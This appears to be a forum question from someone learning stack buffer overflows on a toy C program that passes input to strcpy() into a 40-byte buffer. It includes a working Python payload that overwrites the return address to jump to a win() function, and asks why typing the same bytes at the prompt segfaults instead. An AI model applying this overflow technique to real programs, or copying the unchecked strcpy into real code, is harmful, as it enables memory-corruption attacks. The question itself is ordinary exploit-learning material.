# Exploit buffer overflow for strcpy()

I would like to understand a problem I am facing while trying to exploit a buffer overflow for the c below

#include <stdio.h>
#include <string.h>
#include <stdlib.h>


int win()
{
    printf("Great Job\n");
    exit(0);
}


int mycpy(char* input)
{
    char buffer[40];
    strcpy(buffer, input);
    return strlen(buffer);
}


int main()
{
    char buffer[256];
    unsigned long long target;

    scanf("%256s", buffer);
    printf("You sent: %s\n", buffer);
    mycpy(buffer);
    exit(1);

}


If I run the payload in the following way
python3 -c 'print ("a" * 56 + "\x66\x11\x40\x00")' | ./p_5

I got the "Great Job" printed on the console and so the attack is successful
But if I pass the same string (like below) from the command line, I just get a segmentation fault.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x66\x11\x40\x00

For which reason the program is behaving differently with the same input?
Thanks in advance
